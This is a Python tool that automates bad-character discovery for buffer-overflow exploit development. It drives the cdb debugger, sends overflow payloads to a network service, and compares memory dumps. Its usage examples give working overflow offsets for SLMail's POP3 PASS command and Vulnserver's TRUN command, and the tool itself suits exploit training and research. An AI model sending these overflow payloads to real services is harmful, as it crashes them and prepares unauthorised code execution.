#!/usr/bin/env python3
"""
badchar_auto.py  -  Automated bad character discovery via cdb.exe + .writemem
Version 1.0.0

Runs on Windows. Requires cdb.exe from Debugging Tools for Windows.
Pure stdlib. No pip. Python 3.7+.

USAGE - CLI (simple protocols):
    python badchar_auto.py ^
        --cdb "C:\\Tools\\x86\\cdb.exe" ^
        --target "C:\\SLMail\\slmail.exe" ^
        --host 127.0.0.1 --port 110 ^
        --offset 2606 --size 3000 ^
        --breakpoint "msvcrt!strcpy" ^
        --dump-expr "poi(@esp+4)" ^
        --step pt ^
        --exclude 00,0a,0d ^
        --prefix "USER test\\r\\nPASS " --suffix "\\r\\n"

USAGE - importable (stateful/custom protocols):
    from badchar_auto import BadCharOrchestrator, Stage
    # define your own sender, pass to BadCharOrchestrator
    # see examples/ directory

HOW IT WORKS:
    1. Python generates a cdb script (C:\\badchar\\badchar_bp.wds)
    2. cdb is spawned attached to the target
    3. On each iteration, Python sends a payload:
           [A * offset][MAGIC 4B][test bytes][C * pad]
    4. cdb breakpoint fires, saves the dst pointer, steps to return,
       dumps the destination buffer to _tmp.bin, renames to dump.bin
    5. Python reads dump.bin, validates MAGIC, feeds observed bytes
       to BadCharAnalyzer, updates the known-bad set
    6. Repeat until a clean pass

MAGIC default: \\xBC\\xF0\\xBC\\xF0 (no NULL, no CR/LF, not protocol-sensitive)
Magic bytes must not overlap with --exclude. Startup aborts if they do.
"""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional, Set, Tuple

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

VERSION       = "1.0.0"
MAGIC_BINARY  = b"\xBC\xF0\xBC\xF0"
MAGIC_ASCII   = b"w00t"
MAGIC_LEN     = 4
DUMP_DIR_DEFAULT = r"C:\badchar"

# ---------------------------------------------------------------------------
# BadCharAnalyzer
# Inlined from Tools/badchars/badchars.py so this file has no package deps.
# ---------------------------------------------------------------------------

class BadCharResult:
    def __init__(self, badchars: List[int], transformed: Dict[int, int]) -> None:
        self.badchars    = badchars
        self.transformed = transformed

    def __bool__(self) -> bool:
        return bool(self.badchars or self.transformed)


class BadCharAnalyzer:
    def __init__(self, exclude: Tuple[int, ...] = (0x00,)) -> None:
        self.exclude = set(exclude)

    def generate_test_bytes(self) -> bytes:
        return bytes(i for i in range(256) if i not in self.exclude)

    def analyze(self, expected: bytes, observed: bytes) -> BadCharResult:
        badchars:    Set[int]      = set()
        transformed: Dict[int,int] = {}
        i = 0
        j = 0
        while i < len(expected):
            if j >= len(observed):
                badchars.update(expected[i:])
                break
            exp = expected[i]
            obs = observed[j]
            if exp == obs:
                i += 1
                j += 1
                continue
            try:
                next_match = expected.index(obs, i + 1)
            except ValueError:
                next_match = None
            if next_match is not None:
                for k in range(i, next_match):
                    badchars.add(expected[k])
                i = next_match
                continue
            badchars.add(exp)
            transformed[exp] = obs
            i += 1
            j += 1
        return BadCharResult(badchars=sorted(badchars), transformed=transformed)

# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------

@dataclass
class Stage:
    """
    One instrumented point in the target's execution.

    breakpoint:  WinDbg symbol or address, e.g. "msvcrt!strcpy"
    dump_expr:   WinDbg expression that evaluates to the buffer start
                 at the moment of the break, e.g. "poi(@esp+4)"
                 Include your payload offset here if needed:
                 "poi(@esp+4)+2606"
    dump_size:   Bytes to capture. Should cover MAGIC_LEN + 255 + headroom.
    step_mode:   "none" - breakpoint is already past the copy; dump directly
                 "pt"   - step to the next ret from entry point (recommended)
                 "gu"   - run until function returns (use only when safe)
                 anything else is injected as a raw WinDbg command
    """
    name:       str
    breakpoint: str
    dump_expr:  str
    dump_size:  int
    step_mode:  str


class DumpResult:
    """Discriminated union base. Check isinstance() to dispatch."""


class SuccessfulDump(DumpResult):
    def __init__(self, data: bytes) -> None:
        self.data = data

class CrashBeforeDump(DumpResult):
    """Target crashed before the breakpoint produced a dump."""
    def __init__(self, transcript: str) -> None:
        self.transcript = transcript

class DumpTimeout(DumpResult):
    """Breakpoint never fired within the timeout window."""
    def __init__(self, elapsed: float) -> None:
        self.elapsed = elapsed

class ShortDump(DumpResult):
    """Dump file was too small to contain MAGIC + any test bytes."""
    def __init__(self, got: int, expected: int) -> None:
        self.got      = got
        self.expected = expected

class MagicMismatch(DumpResult):
    """First 4 bytes of dump did not match the configured magic."""
    def __init__(self, found: bytes) -> None:
        self.found = found

class DebuggerExited(DumpResult):
    """cdb exited without a recognised crash marker."""
    def __init__(self, returncode: int) -> None:
        self.returncode = returncode

# ---------------------------------------------------------------------------
# WDS Generator
# ---------------------------------------------------------------------------

def generate_wds(
    stage:     Stage,
    dump_dir:  str,
    tmp_path:  str,
    dump_path: str,
) -> str:
    """
    Return the text of a cdb/WinDbg script (.wds) for one stage.

    The generated file is static for the duration of a run.
    Python owns all iteration logic; cdb stays stateless.

    Breakpoint command structure:
        1. Save dump_expr result in pseudo-register $t0 (before any stepping
           could unwind the frame)
        2. Optional step (pt / gu / custom)
        3. .writemem $t0 -> _tmp.bin
        4. Atomic rename _tmp.bin -> dump.bin  (Python polls for dump.bin)
        5. g  (continue)

    Note on paths: no spaces allowed in dump_dir / paths. Quotes inside a
    WinDbg bp command string end the string early.
    """
    size_hex = "0x{:x}".format(stage.dump_size + MAGIC_LEN + 16)  # headroom

    if stage.step_mode == "none":
        step_part = ""
    elif stage.step_mode in ("pt", "gu"):
        step_part = "{}; ".format(stage.step_mode)
    else:
        step_part = "{}; ".format(stage.step_mode.rstrip(";").strip())

    bp_action = (
        "r @$t0 = {expr}; "
        "{step}"
        ".writemem {tmp} @$t0 L?{size}; "
        ".shell cmd /c move /Y {tmp} {dump}; "
        "g"
    ).format(
        expr  = stage.dump_expr,
        step  = step_part,
        tmp   = tmp_path,
        dump  = dump_path,
        size  = size_hex,
    )

    return "\n".join([
        "; Generated by badchar_auto.py v{} - DO NOT EDIT".format(VERSION),
        "; Stage: {}  breakpoint: {}  step: {}".format(
            stage.name, stage.breakpoint, stage.step_mode),
        "",
        "; Exception policy",
        "sxd ibp",                  # ignore initial breakpoint
        "sxd ld",                   # ignore module loads
        "sxn av",                   # first-chance AV: notify, continue
        "",
        "; Ensure dump directory exists",
        ".shell cmd /c mkdir {} 2>nul".format(dump_dir),
        "",
        "; Install breakpoint",
        'bp {} "{}"'.format(stage.breakpoint, bp_action),
        "",
        "; Run",
        "g",
    ])

# ---------------------------------------------------------------------------
# CDB Driver
# ---------------------------------------------------------------------------

class CDBDriver:
    """
    Manages one cdb.exe subprocess.

    stdout is read continuously in a background daemon thread so the main
    loop never blocks. The transcript is written to a per-run log file.
    Call drain() after the process exits to ensure all output is captured.
    """

    CRASH_MARKER = "BADCHAR_CRASH"

    def __init__(
        self,
        cdb_path:   str,
        target_exe: str,
        script_path: str,
    ) -> None:
        self._cdb_path    = cdb_path
        self._target_exe  = target_exe
        self._script_path = script_path

        self._proc:            Optional[subprocess.Popen] = None
        self._transcript:      List[str]                  = []
        self._reader:          Optional[threading.Thread] = None
        self._read_done:       threading.Event            = threading.Event()
        self._lock:            threading.Lock             = threading.Lock()
        self._transcript_path: Optional[str]              = None

    def start(self, transcript_path: Optional[str] = None) -> None:
        self._transcript      = []
        self._transcript_path = transcript_path
        self._read_done.clear()

        cmd = [
            self._cdb_path,
            "-o",             # debug child processes too
            "-g",             # pass initial breakpoint
            "-G",             # pass final breakpoint
            "-c", '$$>< "{}"'.format(self._script_path),
            self._target_exe,
        ]

        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
        )

        self._reader = threading.Thread(target=self._read_stdout, daemon=True)
        self._reader.start()

    def _read_stdout(self) -> None:
        tf = None
        if self._transcript_path:
            try:
                tf = open(self._transcript_path, "w", encoding="utf-8", errors="replace")
            except OSError:
                pass
        try:
            for raw in self._proc.stdout:
                line = raw.decode("utf-8", errors="replace").rstrip()
                with self._lock:
                    self._transcript.append(line)
                if tf:
                    tf.write(line + "\n")
                    tf.flush()
        finally:
            if tf:
                tf.close()
            self._read_done.set()

    def drain(self, timeout: float = 3.0) -> None:
        """Wait for stdout reader to finish. Call after process exits."""
        self._read_done.wait(timeout=timeout)

    def is_running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def returncode(self) -> Optional[int]:
        return self._proc.poll() if self._proc else None

    def saw_crash_marker(self) -> bool:
        with self._lock:
            return any(self.CRASH_MARKER in ln for ln in self._transcript)

    def transcript_text(self) -> str:
        with self._lock:
            return "\n".join(self._transcript)

    def last_lines(self, n: int = 8) -> str:
        with self._lock:
            return "\n".join(self._transcript[-n:])

    def kill(self) -> None:
        if self._proc and self.is_running():
            self._proc.kill()

    def wait(self, timeout: float = 5.0) -> Optional[int]:
        if not self._proc:
            return None
        try:
            return self._proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            return None

# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

class BadCharOrchestrator:
    """
    Owns the complete bad character discovery loop.

    Payload layout per iteration:
        [A * offset] [MAGIC 4 bytes] [test_bytes] [C * pad_to_total_size]

    dump_expr must evaluate to the address of the DESTINATION buffer's start.
    The dump begins at that address, so Python always checks dump[0:4] == MAGIC.
    BadCharAnalyzer receives dump[4 : 4 + len(test_bytes)] as "observed".

    If cdb_path / target_exe are omitted, the debugger is assumed to be
    running externally and already loaded with the generated WDS script.
    """

    def __init__(
        self,
        stage:             Stage,
        sender:            Callable[[bytes], None],
        offset:            int,
        total_size:        int,
        exclude:           Tuple[int, ...] = (0x00,),
        magic:             bytes           = MAGIC_BINARY,
        dump_dir:          str             = DUMP_DIR_DEFAULT,
        cdb_path:          Optional[str]   = None,
        target_exe:        Optional[str]   = None,
        timeout:           int             = 15,
        restart_on_crash:  bool            = True,
        restart_delay:     float           = 1.5,
        log_dir:           Optional[str]   = None,
    ) -> None:
        self._stage            = stage
        self._sender           = sender
        self._offset           = offset
        self._total_size       = total_size
        self._magic            = magic
        self._dump_dir         = dump_dir
        self._dump_path        = os.path.join(dump_dir, "dump.bin")
        self._tmp_path         = os.path.join(dump_dir, "_tmp.bin")
        self._script_path      = os.path.join(dump_dir, "badchar_bp.wds")
        self._timeout          = timeout
        self._restart_on_crash = restart_on_crash
        self._restart_delay    = restart_delay
        self._log_dir          = log_dir or dump_dir
        self._exclude          = set(exclude)
        self._analyzer         = BadCharAnalyzer(exclude=exclude)

        # Hard failure: magic bytes that are also bad chars break the
        # validation mechanism before a single iteration can succeed.
        bad_magic = [b for b in magic if b in self._exclude]
        if bad_magic:
            raise ValueError(
                "Magic bytes overlap with excluded bytes: {}. "
                "Use --magic-mode ascii, or choose a different magic.".format(
                    " ".join("0x{:02x}".format(b) for b in bad_magic)
                )
            )

        self._cdb: Optional[CDBDriver] = None
        if cdb_path and target_exe:
            self._cdb = CDBDriver(
                cdb_path    = cdb_path,
                target_exe  = target_exe,
                script_path = self._script_path,
            )

    # ---- setup -----------------------------------------------------------

    def _ensure_dirs(self) -> None:
        os.makedirs(self._dump_dir, exist_ok=True)
        os.makedirs(self._log_dir,  exist_ok=True)

    def _write_script(self) -> None:
        content = generate_wds(
            stage     = self._stage,
            dump_dir  = self._dump_dir,
            tmp_path  = self._tmp_path,
            dump_path = self._dump_path,
        )
        with open(self._script_path, "w") as fh:
            fh.write(content)

    # ---- payload ---------------------------------------------------------

    def _build_payload(self, test_bytes: bytes) -> bytes:
        body  = self._magic + test_bytes
        pad   = max(0, self._total_size - self._offset - len(body))
        return b"A" * self._offset + body + b"C" * pad

    # ---- dump lifecycle --------------------------------------------------

    def _clear_stale(self) -> None:
        for p in (self._dump_path, self._tmp_path):
            try:
                os.remove(p)
            except OSError:
                pass

    def _wait_for_dump(self) -> DumpResult:
        deadline = time.time() + self._timeout

        while time.time() < deadline:
            if os.path.exists(self._dump_path):
                try:
                    s1 = os.path.getsize(self._dump_path)
                    time.sleep(0.02)
                    s2 = os.path.getsize(self._dump_path)
                    if s1 == s2 and s1 >= MAGIC_LEN:
                        with open(self._dump_path, "rb") as fh:
                            data = fh.read()
                        os.remove(self._dump_path)
                        return SuccessfulDump(data)
                except OSError:
                    pass

            if self._cdb and not self._cdb.is_running():
                self._cdb.drain()
                if self._cdb.saw_crash_marker():
                    return CrashBeforeDump(self._cdb.transcript_text())
                rc = self._cdb.returncode()
                return DebuggerExited(rc if rc is not None else -1)

            time.sleep(0.05)

        return DumpTimeout(float(self._timeout))

    def _validate(self, data: bytes, test_bytes: bytes) -> DumpResult:
        if len(data) < MAGIC_LEN + 1:
            return ShortDump(len(data), MAGIC_LEN + len(test_bytes))
        if data[:MAGIC_LEN] != self._magic:
            return MagicMismatch(data[:MAGIC_LEN])
        observed = data[MAGIC_LEN : MAGIC_LEN + len(test_bytes)]
        return SuccessfulDump(observed)

    # ---- debugger lifecycle ----------------------------------------------

    def _ensure_cdb_running(self, iteration: int) -> bool:
        if self._cdb is None:
            return True

        if self._cdb.is_running():
            return True

        if iteration > 1 and not self._restart_on_crash:
            print("[-] Debugger not running and --no-restart is set.")
            return False

        log_path = os.path.join(
            self._log_dir, "cdb_{:04d}.log".format(iteration)
        )
        self._write_script()
        self._cdb.start(transcript_path=log_path)
        time.sleep(self._restart_delay)
        return True

    # ---- public API ------------------------------------------------------

    def run_once(
        self,
        known_bad: Optional[Set[int]] = None,
    ) -> Tuple[DumpResult, Optional[BadCharResult]]:
        """Send one payload and return (DumpResult, BadCharResult | None)."""
        if known_bad is None:
            known_bad = set()

        test_bytes = bytes(
            b for b in range(1, 256)
            if b not in self._exclude and b not in known_bad
        )

        self._clear_stale()
        self._sender(self._build_payload(test_bytes))

        raw = self._wait_for_dump()
        if not isinstance(raw, SuccessfulDump):
            return raw, None

        validated = self._validate(raw.data, test_bytes)
        if not isinstance(validated, SuccessfulDump):
            return validated, None

        return validated, self._analyzer.analyze(test_bytes, validated.data)

    def run_full(self, max_iterations: int = 30) -> List[int]:
        """
        Iterate until a clean pass. Returns sorted list of confirmed bad chars.
        Stops early on unrecoverable errors.
        """
        self._ensure_dirs()
        known_bad: Set[int] = set()

        for i in range(1, max_iterations + 1):
            if not self._ensure_cdb_running(i):
                break

            candidates = 255 - len(self._exclude) - len(known_bad)
            _log("[*] Iter {:2d}: {} bytes to test  |  bad so far: {}".format(
                i, candidates,
                _fmt(sorted(known_bad)) if known_bad else "none",
            ))

            result, bc = self.run_once(known_bad)

            # --- dispatch on result type ---

            if isinstance(result, CrashBeforeDump):
                _log("[!] Crash before dump (iter {}).".format(i))
                _log("    Last cdb output:")
                for ln in result.transcript.splitlines()[-5:]:
                    _log("      " + ln)
                if self._restart_on_crash:
                    _log("    Restarting debugger.")
                    if self._cdb:
                        self._cdb.kill()
                    continue
                break

            if isinstance(result, DebuggerExited):
                _log("[-] Debugger exited (rc={}) without crash marker.".format(
                    result.returncode))
                _log("    Check cdb_{:04d}.log for details.".format(i))
                break

            if isinstance(result, DumpTimeout):
                _log("[-] Timeout after {}s. Breakpoint may not have fired.".format(
                    int(result.elapsed)))
                _log("    Verify --breakpoint and --dump-expr, then retry.")
                break

            if isinstance(result, ShortDump):
                _log("[-] Short dump: {} bytes (need {}). Check --dump-size.".format(
                    result.got, result.expected))
                break

            if isinstance(result, MagicMismatch):
                _log("[-] Magic mismatch. Got: 0x{}".format(result.found.hex()))
                _log("    --dump-expr may point to wrong address.")
                _log("    Check --offset and --dump-expr.")
                break

            # SuccessfulDump with analysis
            if bc is None:
                _log("[-] No analysis result.")
                break

            if not bc:
                _log("[+] Clean pass.")
                break

            newly = set(bc.badchars) | set(bc.transformed.keys())
            known_bad |= newly
            _log("[!] Found: {}".format(_fmt(sorted(newly))))
            for src, dst in bc.transformed.items():
                _log("    \\x{:02x} -> \\x{:02x}  (transformed)".format(src, dst))
        else:
            _log("[-] Reached max iterations ({}).".format(max_iterations))

        if self._cdb:
            self._cdb.kill()

        final = sorted(known_bad)
        print()
        print("[+] Confirmed bad chars ({}):".format(len(final)))
        print("    " + (_fmt(final) if final else "none"))
        print("    Python: [{}]".format(
            ", ".join("0x{:02x}".format(b) for b in final)
        ))
        return final

# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def _log(msg: str) -> None:
    print(msg, flush=True)


def _fmt(values: List[int]) -> str:
    return " ".join("\\x{:02x}".format(b) for b in values)


def make_tcp_sender(
    host:   str,
    port:   int,
    prefix: bytes = b"",
    suffix: bytes = b"",
) -> Callable[[bytes], None]:
    """
    Returns a send function for raw TCP.
    Use prefix/suffix for simple framing (e.g. b"TRUN /.:/" + payload).
    For stateful protocols (POP3 auth, FTP login), write a custom sender
    instead - see examples/ directory.
    """
    def send(payload: bytes) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((host, port))
            s.sendall(prefix + payload + suffix)
        finally:
            s.close()
    return send

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _parse_hex_list(s: str) -> Tuple[int, ...]:
    return tuple(int(x.strip(), 16) for x in s.split(",") if x.strip())


def _unescape(s: str) -> bytes:
    r"""
    Expand \r \n \t in CLI string args to real bytes.
    Input arrives from the shell as literal backslash sequences.
    """
    return (
        s
        .encode("raw_unicode_escape")
        .decode("unicode_escape")
        .encode("latin-1")
    )


def _make_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="badchar_auto.py",
        description="Automated bad character discovery via cdb.exe",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
step modes:
  none  breakpoint is already past the copy; dump immediately
  pt    step to the next ret (recommended for function-entry breakpoints)
  gu    run until function returns (use only when frame behaviour is known safe)

common dump-expr values:
  poi(@esp+4)         cdecl dst arg  (strcpy, memcpy)
  poi(@esp+8)         cdecl src arg  (use when src is what survives)
  @ecx                fastcall first arg
  poi(@esp+4)+N       skip N bytes of padding before the test region

examples:
  SLMail PASS (POP3):
    python badchar_auto.py --cdb C:\\Tools\\cdb.exe --target C:\\SLMail\\slmail.exe
        --host 127.0.0.1 --port 110 --offset 2606 --size 3000
        --breakpoint msvcrt!strcpy --dump-expr poi(@esp+4)
        --step pt --exclude 00,0a,0d
        --prefix "USER test\\r\\nPASS " --suffix "\\r\\n"

  Vulnserver TRUN (raw TCP):
    python badchar_auto.py --cdb C:\\Tools\\cdb.exe --target C:\\vulnserver\\vulnserver.exe
        --host 127.0.0.1 --port 9999 --offset 2006 --size 3000
        --breakpoint msvcrt!strcpy --dump-expr poi(@esp+4)
        --step pt --prefix "TRUN ./:" --suffix ""
""",
    )

    g = p.add_argument_group("target")
    g.add_argument("--host",   required=True)
    g.add_argument("--port",   required=True, type=int)
    g.add_argument("--prefix", default="",
                   help=r"Protocol prefix prepended to payload (supports \r\n)")
    g.add_argument("--suffix", default="",
                   help=r"Protocol suffix appended to payload (supports \r\n)")

    g = p.add_argument_group("debugger")
    g.add_argument("--cdb",    metavar="PATH", help="Path to cdb.exe")
    g.add_argument("--target", metavar="EXE",  help="Target executable path")
    g.add_argument("--dump-dir",  default=DUMP_DIR_DEFAULT,
                   help="Directory for dump files and generated script "
                        "(default: C:\\badchar). No spaces in path.")
    g.add_argument("--restart",    dest="restart", action="store_true",  default=True,
                   help="Restart cdb after crash (default)")
    g.add_argument("--no-restart", dest="restart", action="store_false",
                   help="Stop on first crash instead of restarting")
    g.add_argument("--restart-delay", type=float, default=1.5,
                   help="Seconds to wait after starting cdb (default: 1.5)")

    g = p.add_argument_group("breakpoint / stage")
    g.add_argument("--breakpoint", default="msvcrt!strcpy",
                   help="Breakpoint symbol or address (default: msvcrt!strcpy)")
    g.add_argument("--dump-expr",  default="poi(@esp+4)",
                   help="WinDbg expression for buffer start (default: poi(@esp+4))")
    g.add_argument("--dump-size",  type=int, default=512,
                   help="Bytes to dump via .writemem (default: 512)")
    g.add_argument("--step",
                   choices=["none", "pt", "gu"], default="pt",
                   help="Step behaviour after breakpoint hits (default: pt)")

    g = p.add_argument_group("payload")
    g.add_argument("--offset",  required=True, type=int,
                   help="Byte offset where MAGIC+test bytes start in the payload")
    g.add_argument("--size",    required=True, type=int,
                   help="Total payload length in bytes")
    g.add_argument("--exclude", default="00",
                   help="Comma-separated hex bytes to skip entirely (default: 00)")
    g.add_argument("--magic-mode", choices=["binary", "ascii"], default="binary",
                   help="Magic marker mode: binary=\\xBC\\xF0\\xBC\\xF0, "
                        "ascii=w00t (default: binary)")
    g.add_argument("--magic",   default=None,
                   help="Override magic as a hex string, e.g. DEADBEEF")

    g = p.add_argument_group("tuning")
    g.add_argument("--timeout",   type=int,   default=15,
                   help="Seconds to wait for dump.bin per iteration (default: 15)")
    g.add_argument("--max-iter",  type=int,   default=30,
                   help="Maximum iterations before giving up (default: 30)")

    return p


def main() -> int:
    parser = _make_parser()
    args   = parser.parse_args()

    # Resolve magic
    if args.magic:
        try:
            magic = bytes.fromhex(args.magic)
        except ValueError:
            print("[-] --magic must be a hex string, e.g. DEADBEEF", file=sys.stderr)
            return 1
        if len(magic) != MAGIC_LEN:
            print("[-] Magic must be exactly {} bytes.".format(MAGIC_LEN), file=sys.stderr)
            return 1
    elif args.magic_mode == "ascii":
        magic = MAGIC_ASCII
    else:
        magic = MAGIC_BINARY

    exclude = _parse_hex_list(args.exclude)
    prefix  = _unescape(args.prefix) if args.prefix else b""
    suffix  = _unescape(args.suffix) if args.suffix else b""

    stage = Stage(
        name       = "auto",
        breakpoint = args.breakpoint,
        dump_expr  = args.dump_expr,
        dump_size  = args.dump_size,
        step_mode  = args.step,
    )

    sender = make_tcp_sender(args.host, args.port, prefix, suffix)

    try:
        orch = BadCharOrchestrator(
            stage            = stage,
            sender           = sender,
            offset           = args.offset,
            total_size       = args.size,
            exclude          = exclude,
            magic            = magic,
            dump_dir         = args.dump_dir,
            cdb_path         = args.cdb,
            target_exe       = args.target,
            timeout          = args.timeout,
            restart_on_crash = args.restart,
            restart_delay    = args.restart_delay,
        )
    except ValueError as exc:
        print("[-] Configuration error: {}".format(exc), file=sys.stderr)
        return 1

    print("[*] badchar_auto.py v{}".format(VERSION))
    print("[*] Target       {}:{}".format(args.host, args.port))
    print("[*] Breakpoint   {}  step={}".format(args.breakpoint, args.step))
    print("[*] Dump expr    {}".format(args.dump_expr))
    print("[*] Offset       {}  total size={}".format(args.offset, args.size))
    print("[*] Magic        0x{}  ({})".format(magic.hex().upper(), args.magic_mode))
    print("[*] Exclude      {}".format(args.exclude))
    print("[*] Dump dir     {}".format(args.dump_dir))
    print()

    try:
        orch.run_full(max_iterations=args.max_iter)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
